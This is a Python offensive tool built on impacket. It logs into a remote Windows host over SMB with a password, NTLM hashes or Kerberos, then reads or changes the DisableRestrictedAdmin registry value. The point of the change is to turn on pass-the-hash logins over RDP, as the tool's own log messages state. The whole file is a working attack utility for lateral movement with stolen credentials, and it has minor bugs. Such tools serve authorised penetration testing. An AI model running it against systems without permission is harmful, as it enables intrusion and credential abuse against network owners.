#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : pyRestrictedAmin.py
# Author             : Anh4ckin3 
# Date created       : 20 mars 2025

import argparse 
import pyfiglet 
import sys
import logging

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5 import rrp
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations


class RestrictedAdmin:

    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__remoteOps = None
        self.__doKerberos = options.k
        self.__kdcHost = options.dc_ip
    
        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):

        # START SMB CONN
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)


    def check_status(self):
        
        # CONNECT
        self.connect()
        try:
            remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
            remoteOps.enableRegistry()

            # HKLM Access
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            # registry path AND open registry
            registry_path = f"System\\CurrentControlSet\\Control\\Lsa"
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, registry_path)["phkResult"]

            try:
                query = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "DisableRestrictedAdmin\x00")
                return query[1]
                
            except Exception as e:
                logging.error('RemoteOperations failed: %s' % str(e))
                sys.exit(0) 

        except Exception as e:
                logging.error('RemoteOperations failed: %s' % str(e))


    def enable(self):
        
        self.connect()
        try:
            remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
            remoteOps.enableRegistry()

            # HKLM Access
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            # registry path AND open registry
            registry_path = f"System\\CurrentControlSet\\Control\\Lsa"
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, registry_path)["phkResult"]

            try:
                # SET VALUE TO ONE 
                rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableRestrictedAdmin\x00', rrp.REG_DWORD, 0)
                return True
            except Exception as e:
                logging.error('RemoteOperations failed: %s' % str(e))
                sys.exit(0)
        except Exception as e:
            logging.error('RemoteOperations failed: %s' % str(e))


    def disable(self):
        
        self.connect()
        try:
            remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
            remoteOps.enableRegistry()

            # HKLM Access
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans["phKey"]

            # registry path AND open registry
            registry_path = f"System\\CurrentControlSet\\Control\\Lsa"
            keyHandle = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, registry_path)["phkResult"]

            try:
                # SET VALUE TO ZERO 
                rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableRestrictedAdmin\x00', rrp.REG_DWORD, 1)
                return True
            except Exception as e:
                logging.error('RemoteOperations failed: %s' % str(e))
                sys.exit(0)
        except Exception as e:
            logging.error('RemoteOperations failed: %s' % str(e))

def main():

    print('''
            ______          _        _      _           _  ___      _           _       
            | ___ \        | |      (_)    | |         | |/ _ \    | |         (_)      
 _ __  _   _| |_/ /___  ___| |_ _ __ _  ___| |_ ___  __| / /_\ \ __| |_ __ ___  _ _ __  
| '_ \| | | |    // _ \/ __| __| '__| |/ __| __/ _ \/ _` |  _  |/ _` | '_ ` _ \| | '_ \ 
| |_) | |_| | |\ \  __/\__ \ |_| |  | | (__| ||  __/ (_| | | | | (_| | | | | | | | | | |
| .__/ \__, \_| \_\___||___/\__|_|  |_|\___|\__\___|\__,_\_| |_/\__,_|_| |_| |_|_|_| |_|
| |     __/ |                                                                           
|_|    |___/                                                        by: @Anh4ckin3
    
    ''')

    parser = argparse.ArgumentParser(add_help = True, description = "Perform actions on DisableRestrictedAdmin registry key.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-action', choices=['read', 'enable', 'disable', ], nargs='?', default='read', help='Action to operate on DisableRestrictedAdmin registry key (default read)')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = remoteName

    if domain is None:
        domain = ''

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
        options.k = True

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    call = RestrictedAdmin(remoteName, username, password, domain, options)

    # INIT PROGRAM
    try:
        if options.action == 'read':
            # READ MODE
            read = call.check_status()
            if read == 1 : 
                logging.warning('DisableRestrictedAdmin key is set to 0x1, pth on RDP is not allowed.')
            if read == 0 :
                logging.info('DisableRestrictedAdmin key is set to 0X0, pth on RDP is allowed.') 

        if options.action == 'disable':
            # DISABLE MODE
            disable = call.disable()
            if disable :
                if call.check_status() == 1:
                    logging.info('Operation complete successfully.')

        if options.action == 'enable':
            # ENABLE MODE
            enable = call.enable()
            if enable == True :
                if call.check_status() == 0:
                    logging.info('Operation complete successfully.')

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)

if __name__ == "__main__":
    main()